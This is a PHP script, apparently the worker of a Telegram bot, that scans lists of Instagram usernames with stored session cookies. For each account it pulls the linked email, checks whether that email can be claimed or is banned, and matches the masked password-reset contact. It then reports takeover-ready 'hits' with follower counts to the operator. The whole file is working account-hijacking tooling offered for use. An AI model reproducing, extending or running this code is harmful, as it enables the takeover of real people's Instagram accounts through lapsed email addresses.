<?php
date_default_timezone_set('Asia/Baghdad');
$config = json_decode(file_get_contents('config.json'),1);
$id = $config['id'];
$token = $config['token'];
$config['filter'] = $config['filter'] != null ? $config['filter'] : 1;
$screen = file_get_contents('screen');
exec('kill -9 ' . file_get_contents($screen . 'pid'));
file_put_contents($screen . 'pid', getmypid());
include 'index.php';
$accounts = json_decode(file_get_contents('accounts.json') , 1);
$cookies = $accounts[$screen]['cookies'];
$useragent = $accounts[$screen]['useragent'];
$users = explode("\n", file_get_contents($screen));
$uu = explode(':', $screen) [0];
$file = $config['for'];
	$ig = new ig(['account'=>$accounts[$file],'file'=>$file]);
function verfmatch($u,$email){
  usleep(555555);
global $ig;
if(preg_match('/(live|hotmail|outlook)\.(.*)/', $email)){
    $check_mail = inInsta($email);
     if ($check_mail !== false) {
        return "Good";
          }else{
       return "bad";
     }
    }
  $check_mail = $ig->sign_in_help($email);
if($check_mail->status == "ok"){
 if(strstr($email,"@gmail.com")){
   $ban = check_ban($email);
    if($ban == "Yes"){
  usleep(555555);
  $check_user = $ig->sign_in_help($u);
print_r($check_user);
if($check_user->status == "ok"){
  $restmail = $check_user->contact_point; 
$em = verfyRest($email,$restmail);
return $em;
        }
      }
    }else{
       usleep(555555);
  $check_user = $ig->sign_in_help($u);
if($check_user->status == "ok"){
  $restmail = $check_user->contact_point; 
$em = verfyRest($email,$restmail);
return $em;
        }
    }
  }else{
   print_r($check_mail);
  }
}
function verfyRest($email,$restmail){
  $ex = explode("@",$email)[0];
  $exx = explode("@",$email)[1];
  $e = explode("@",$restmail)[0];
  $ee = explode("@",$restmail)[1];
if($ex[0] == $e[0] and $ex[-1] == $e[-1] and $exx[0] == $ee[0] and $exx[-1] == $ee[-1]){
  return "Good";
}else{
  return "Bad";
  }
}
$se = 100;
$i = 0;
$gmail = 0;
$hotmail = 0;
$yahoo = 0;
$mailru = 0;
$aol = 0;
$true = 0;
$false = 0;
$hunter2 = 0;
$hunter1 = 0;
$ahmed = 0;
$hunter = 0;
$edit = bot('sendMessage',[
    'chat_id'=>$id,
    'text'=>"- *Status:*",
    'parse_mode'=>'markdown',
    'reply_markup'=>json_encode([
            'inline_keyboard'=>[
                [['text'=>'𝐂𝐇𝐄𝐂𝐊: '.$i,'callback_data'=>'fgf']],
                [['text'=>'𝗨𝗦𝗘𝗥: '.$user,'callback_data'=>'fgdfg']],
                [['text'=>"𝐆𝐌𝐀𝐈𝐋: $gmail",'callback_data'=>'dfgfd'],['text'=>"𝐘𝐀𝐇𝐎𝐎: $yahoo",'callback_data'=>'gdfgfd']],
                [['text'=>'𝐌𝐀𝐈𝐋𝐑𝐔: '.$mailru,'callback_data'=>'fgd'],['text'=>'𝐇𝐎𝐓𝐌𝐀𝐈𝐋: '.$hotmail,'callback_data'=>'ghj']],
                [['text'=>'𝐀𝐎𝐋 : '.$aol,'callback_data'=>'hunter.aol']], 
                [['text'=>'𝐍𝐎𝐓 𝐁𝗨𝐒𝐈𝐍𝐄𝐒𝐒: '.$ahmed,'callback_data'=>'hdhdh']],
                [['text'=>'𝐁𝗨𝐒𝐈𝐍𝐄𝐒𝐒: '.$hunter1,'callback_data'=>'hdfhdh']],
                [['text'=>'𝐍𝐎 𝐑𝐄𝐒𝐓: '.$hunter,'callback_data'=>'hunter7']],
                [['text'=>'𝐁𝐋𝐀𝐂𝐊𝐋𝐈𝐒𝐓: '.$hunter2,'callback_data'=>'hunter9']],
                [['text'=>'𝗧𝗥𝗨𝗘 ✅: '.$true,'callback_data'=>'gj']],
                [['text'=>'𝐅𝐀𝐋𝐒𝐄 ❌: '.$false,'callback_data'=>'dghkf']]
            ]
        ])
]);
$se = 100;
$editAfter = 1;
foreach ($users as $user) {
    $info = getInfo($user, $cookies, $useragent);
    if ($info != false ) {
        $mail = trim($info['mail']);
        $usern = $info['user'];
        $e = explode('@', $mail);
               if (preg_match('/(live|hotmail|outlook|yahoo|Yahoo|yAhoo)\.(.*)|(gmail)\.(com)|(mail|bk|yandex|inbox|list)\.(ru)/i', $mail,$m)) {
            echo 'check ' . $mail . PHP_EOL;
             $ahmed +=1;
                    if(checkMail($mail) == 1){
                        $verf = verfmatch($usern,$mail);
                        if($verf == "Good"){
                                echo "True - $user - " . $mail . "\n";
                                if(strpos($mail, 'gmail.com')){
                                    $gmail += 1;
                                } elseif(strpos($mail, 'hotmail.') or strpos($mail,'outlook.') or strpos($mail,'live.com')){
                                    $hotmail += 1;
                                } elseif(strpos($mail, 'yahoo')){
                                    $yahoo += 1;
                                } elseif(preg_match('/(mail|bk|yandex|inbox|list)\.(ru)/i', $mail)){
                                    $mailru += 1;
                                } elseif(strpos($mail, 'aol.com')){
                                	$aol += 1;
                                }
                                $follow = $info['f'];
                                $following = $info['ff'];
                                $media = $info['m'];
                                bot('sendMessage', ['disable_web_page_preview' => true, 'chat_id' => $id, 'text' => " 𝐇𝐈 𝐁𝐑𝐎 𝐍𝐄𝐖 𝐇𝐈𝐓𝐒 🤍🔥
━━━━━━━━━━━━
.☆ . 𝚄𝚂𝙴𝚁 : `$usern`\n 
.𖢸 . 𝙴𝙼𝙰𝙸𝙻 : `$mail`\n 
.☆ . 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 : $follow\n 
.𖢸 . 𝙵𝙾𝙻𝙻𝙾𝚆𝙸𝙽𝙶 : $following\n 
.☆. 𝙿𝙾𝚂𝚃 : $media\n
.𖢸 . 𝚃𝙸𝙼𝙴 : ".date("Y")."/".date("n")."/".date("d")." : " . date('g:i') . "\n" . " 
━━━━━━━━━━━━
↯Tele↯.                     ↯CH↯\n
:-  @Y_OMO              :-  @TTTPTTTTT",

                                
                                'parse_mode'=>'markdown']);
                                
                                bot('editMessageReplyMarkup',[
                                    'chat_id'=>$id,
                                    'message_id'=>$edit->result->message_id,
                                    'reply_markup'=>json_encode([
                                        'inline_keyboard'=>[
                                            [['text'=>'𝐂𝐇𝐄𝐂𝐊: '.$i,'callback_data'=>'fgf']],
                                            [['text'=>'𝗨𝗦𝗘𝗥: '.$user,'callback_data'=>'fgdfg']],
                                            [['text'=>"𝐆𝐌𝐀𝐈𝐋: $gmail",'callback_data'=>'dfgfd'],['text'=>"𝐘𝐀𝐇𝐎𝐎: $yahoo",'callback_data'=>'gdfgfd']],
                                            [['text'=>'𝐌𝐀𝐈𝐋𝐑𝐔: '.$mailru,'callback_data'=>'fgd'],['text'=>'𝐇𝐎𝐓𝐌𝐀𝐈𝐋: '.$hotmail,'callback_data'=>'ghj']], 
                                            [['text'=>'𝐀𝐎𝐋 : '.$aol,'callback_data'=>'hunetr.aol']],
                                            [['text'=>'𝐍𝐎𝐓 𝐁𝗨𝐒𝐈𝐍𝐄𝐒𝐒: '.$ahmed,'callback_data'=>'hdhdh']],
                 					       [['text'=>'𝐁𝗨𝐒𝐈𝐍𝐄𝐒𝐒: '.$hunter1,'callback_data'=>'hdfhdh']],
               							 [['text'=>'𝐍𝐎 𝐑𝐄𝐒𝐓: '.$hunter,'callback_data'=>'hunter7']],
         							       [['text'=>'𝐁𝐋𝐀𝐂𝐊𝐋𝐈𝐒𝐓: '.$hunter2,'callback_data'=>'hunter9']],
            							    [['text'=>'𝗧𝗥𝗨𝗘 ✅: '.$true,'callback_data'=>'gj']],
               							 [['text'=>'𝐅𝐀𝐋𝐒𝐄 ❌: '.$false,'callback_data'=>'dghkf']]
                                        ]
                                    ])
                                ]);
                                $true += 1;
                            // } else {
                            //     echo "Filter , ".$mail.PHP_EOL;
                            // }
                            
                        } else {
                           $hunter2 +=1;
                          echo "No Rest $mail\n";
                        }
                    } else {
                    	$false +=1;
                        echo "Not Vaild 2 - $mail\n";
                    }
        } else {
        	$ahmed +=1;
          echo "BlackList - $mail\n";
        }  
    } elseif(is_string($info)){
        bot('sendMessage',[
            'chat_id'=>$id,
            'text'=>"الحساب - `$screen`\n تم حظره من *الفحص*.",
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                        [['text'=>'نقل اللستة الى حساب ثاني','callback_data'=>'moveList&'.$screen]],
                        [['text'=>'حذف الحساب','callback_data'=>'del&'.$screen]]
                    ]    
            ]),
            'parse_mode'=>'markdown'
        ]);
        exit;
    } else {
    	$ahmed +=1;
        echo "Not Bussines - $user\n";
    }
    usleep(800000);
    $i++;
    file_put_contents($screen, str_replace($user, '', file_get_contents($screen)));
    file_put_contents($screen, preg_replace("/(^[\r\n]*|[\r\n]+)[\s\t]*[\r\n]+/", "", file_get_contents($screen)));
    if($i == $editAfter){
            bot('editMessageReplyMarkup',[
            'chat_id'=>$id,
            'message_id'=>$edit->result->message_id,
            'reply_markup'=>json_encode([
                'inline_keyboard'=>[
                    [['text'=>'𝐂𝐇𝐄𝐂𝐊: '.$i,'callback_data'=>'fgf']],
                    [['text'=>'𝗨𝗦𝗘𝗥: '.$user,'callback_data'=>'fgdfg']],
                    [['text'=>"𝐆𝐌𝐀𝐈𝐋: $gmail",'callback_data'=>'dfgfd'],['text'=>"𝐘𝐀𝐇𝐎𝐎: $yahoo",'callback_data'=>'gdfgfd']],
                    [['text'=>'𝐌𝐀𝐈𝐋𝐑𝐔: '.$mailru,'callback_data'=>'fgd'],['text'=>'𝐇𝐎𝐓𝐌𝐀𝐈𝐋: '.$hotmail,'callback_data'=>'ghj']],
                    [['text'=>'𝐀𝐎𝐋 : '.$aol,'callback_data'=>'hunter.aol']], 
                    [['text'=>'𝐍𝐎𝐓 𝐁𝗨𝐒𝐈𝐍𝐄𝐒𝐒: '.$ahmed,'callback_data'=>'hdhdh']],
              	  [['text'=>'𝐁𝗨𝐒𝐈𝐍𝐄𝐒𝐒: '.$hunter1,'callback_data'=>'hdfhdh']],
               	 [['text'=>'𝐍𝐎 𝐑𝐄𝐒𝐓: '.$hunter,'callback_data'=>'hunter7']],
                	[['text'=>'𝐁𝐋𝐀𝐂𝐊𝐋𝐈𝐒𝐓: '.$hunter2,'callback_data'=>'hunter9']],
                	[['text'=>'𝗧𝗥𝗨𝗘 ✅: '.$true,'callback_data'=>'gj']],
                	[['text'=>'𝐅𝐀𝐋𝐒𝐄 ❌: '.$false,'callback_data'=>'dghkf']]
                ]
            ])
        ]);
        $editAfter += 1;
    }
}
bot('sendMessage', ['chat_id' => $id, 'text' =>"انتهى الفحص يا ابو الصحاب".explode(':',$screen)[0]]);
